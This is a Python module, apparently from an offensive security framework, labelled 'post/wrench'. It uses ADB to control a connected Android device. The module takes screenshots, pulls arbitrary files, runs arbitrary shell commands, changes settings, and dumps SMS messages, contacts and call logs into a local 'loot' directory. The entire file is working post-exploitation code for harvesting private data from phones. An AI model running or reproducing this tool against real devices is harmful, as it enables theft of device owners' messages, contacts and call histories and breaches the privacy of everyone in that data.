import subprocess
import os
from pathlib import Path
from rich.console import Console
from utils.logger import log_action

console = Console()

class Module:
    MODULE_INFO = {
        'name': 'post/wrench',
        'description': 'Advanced ADB-based tool for pulling data and manipulating connected Android devices.',
        'options': {
            'DEVICE_ID': 'Target device serial (from adb devices)',
            'ACTION': 'Action to perform: pull_data, screenshot, list_apps, change_setting, shell_exec, dump_sms, dump_contacts, dump_calllog',
            'PATH': 'Path on device for pull/list actions or setting name for change_setting',
            'VALUE': 'Value for change_setting or command for shell_exec',
            'DEST': 'Local destination for pulled data [default: loot/]'
        }
    }

    def __init__(self, framework):
        self.framework = framework
        self.loot_dir = Path("loot")
        self.loot_dir.mkdir(parents=True, exist_ok=True)

    def run_adb(self, device_id, args):
        cmd = ["adb", "-s", device_id] + args
        return subprocess.run(cmd, capture_output=True, text=True)

    def run(self):
        try:
            device_id = self.framework.options.get('DEVICE_ID')
            action = self.framework.options.get('ACTION', 'screenshot').lower()
            path = self.framework.options.get('PATH')
            value = self.framework.options.get('VALUE')
            dest_dir = Path(self.framework.options.get('DEST', 'loot'))
            dest_dir.mkdir(parents=True, exist_ok=True)

            if not device_id:
                console.print("[red][!] DEVICE_ID is required.[/red]")
                return

            console.print(f"[*] Executing [bold cyan]{action}[/bold cyan] on device [bold yellow]{device_id}[/bold yellow]...")

            if action == 'screenshot':
                remote_path = "/sdcard/screen.png"
                local_path = dest_dir / f"screenshot_{device_id}.png"
                self.run_adb(device_id, ["shell", "screencap", "-p", remote_path])
                self.run_adb(device_id, ["pull", remote_path, str(local_path)])
                self.run_adb(device_id, ["shell", "rm", remote_path])
                console.print(f"[green][+] Screenshot saved to {local_path}[/green]")
                log_action(f"Wrench: Screenshot taken for {device_id}")

            elif action == 'pull_data':
                if not path:
                    console.print("[red][!] PATH (on device) is required for pull_data.[/red]")
                    return
                local_path = dest_dir / Path(path).name
                res = self.run_adb(device_id, ["pull", path, str(local_path)])
                if res.returncode == 0:
                    console.print(f"[green][+] Data pulled to {local_path}[/green]")
                    log_action(f"Wrench: Pulled {path} from {device_id}")
                else:
                    console.print(f"[red][!] Failed to pull data: {res.stderr}[/red]")

            elif action == 'list_apps':
                res = self.run_adb(device_id, ["shell", "pm", "list", "packages", "-f"])
                console.print(f"[bold green][+] Installed Packages:[/bold green]")
                console.print(res.stdout)
                log_action(f"Wrench: Listed apps on {device_id}")

            elif action == 'change_setting':
                if not path or not value:
                    console.print("[red][!] PATH (setting name) and VALUE are required for change_setting.[/red]")
                    return
                # Example: PATH=system, VALUE="screen_brightness 255"
                res = self.run_adb(device_id, ["shell", "settings", "put", path, value])
                if res.returncode == 0:
                    console.print(f"[green][+] Setting {path} updated to {value}[/green]")
                    log_action(f"Wrench: Changed setting {path} to {value} on {device_id}")
                else:
                    console.print(f"[red][!] Failed to change setting: {res.stderr}[/red]")

            elif action == 'dump_sms':
                res = self.run_adb(device_id, ["shell", "content", "query", "--uri", "content://sms"])
                if res.returncode == 0:
                    local_path = dest_dir / f"sms_{device_id}.txt"
                    with open(local_path, "w") as f:
                        f.write(res.stdout)
                    console.print(f"[green][+] SMS messages dumped to {local_path}[/green]")
                    log_action(f"Wrench: Dumped SMS from {device_id}")
                else:
                    console.print(f"[red][!] Failed to dump SMS: {res.stderr}[/red]")

            elif action == 'dump_contacts':
                res = self.run_adb(device_id, ["shell", "content", "query", "--uri", "content://com.android.contacts/data"])
                if res.returncode == 0:
                    local_path = dest_dir / f"contacts_{device_id}.txt"
                    with open(local_path, "w") as f:
                        f.write(res.stdout)
                    console.print(f"[green][+] Contacts dumped to {local_path}[/green]")
                    log_action(f"Wrench: Dumped contacts from {device_id}")
                else:
                    console.print(f"[red][!] Failed to dump contacts: {res.stderr}[/red]")

            elif action == 'dump_calllog':
                res = self.run_adb(device_id, ["shell", "content", "query", "--uri", "content://call_log/calls"])
                if res.returncode == 0:
                    local_path = dest_dir / f"calllog_{device_id}.txt"
                    with open(local_path, "w") as f:
                        f.write(res.stdout)
                    console.print(f"[green][+] Call logs dumped to {local_path}[/green]")
                    log_action(f"Wrench: Dumped call logs from {device_id}")
                else:
                    console.print(f"[red][!] Failed to dump call logs: {res.stderr}[/red]")

            elif action == 'shell_exec':
                if not value:
                    console.print("[red][!] VALUE (command) is required for shell_exec.[/red]")
                    return
                res = self.run_adb(device_id, ["shell", value])
                console.print(f"[bold green][+] Shell Output:[/bold green]")
                console.print(res.stdout)
                if res.stderr:
                    console.print(f"[bold red][!] Shell Errors:[/bold red]")
                    console.print(res.stderr)
                log_action(f"Wrench: Executed shell command '{value}' on {device_id}")

            else:
                console.print(f"[red][!] Unknown action: {action}[/red]")

        except Exception as e:
            console.print(f"[red][!] Wrench Error: {e}[/red]")
            log_action(f"Wrench error on {device_id}: {e}", level="ERROR")
